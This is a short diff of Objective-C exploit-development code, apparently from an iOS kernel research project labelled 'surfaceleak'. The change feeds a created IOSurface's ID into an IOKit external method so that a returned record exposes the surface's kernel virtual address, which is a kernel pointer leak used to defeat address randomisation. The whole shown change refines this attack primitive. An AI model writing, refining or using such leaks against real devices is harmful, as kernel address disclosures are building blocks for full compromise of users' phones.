@@ -32,7 +32,7 @@
 #import "LabLocalTime.h"
 #import "LabRuntimeOffsets.h"
 
-#define P114_BUILD @"p114-surfaceleak-v1.13-fullscan"
+#define P114_BUILD @"p114-surfaceleak-v1.14-sidin"
 
 #import <Foundation/Foundation.h>
 #import <CoreFoundation/CoreFoundation.h>
@@ -350,7 +350,18 @@ static void p114_hexdump(size_t maxn) {
                           @"(honest; capture continues)", c + 1, P114_CAPTURES);
 
             memset(g_p114_out, 0, sizeof(g_p114_out));
-            uint64_t in64 = c ? g_p114_qh : 0;   /* cap 0 honest-shapes zero  */
+            /* v1.14 THE INPUT LAW (the 13:33 same-boot answer): v1.13 sent
+               the FAILED QueueCreate's out[0] (= 0 when kr=2c2) = NO EVENT =
+               the whole 64KB echo zero-filled SELF-INFLICTED. The fleet's
+               P098 law: the input = THE CREATED SURFACE'S SID — the
+               serializer records an event for it, and record+0x18 = the
+               surface's KVA = the IOSurface KVA leak. cap 0 stays zero
+               (the honest no-event control). */
+            uint64_t in64 = (c && surf && g_p114_surfID)
+                          ? (uint64_t)g_p114_surfID(surf) : 0;
+            if (c && in64 == 0)
+                Lf(@"[cap %d/%d] GetID FAILED on the benign surface — zero in "
+                   @"(honest)", c + 1, P114_CAPTURES);
             size_t outLen = sizeof(g_p114_out);
             IOReturn kr = g_p114_callStruct(g_p114_conn, P114_SEL, &in64,
                                             P114_IN_BYTES, g_p114_out, &outLen);
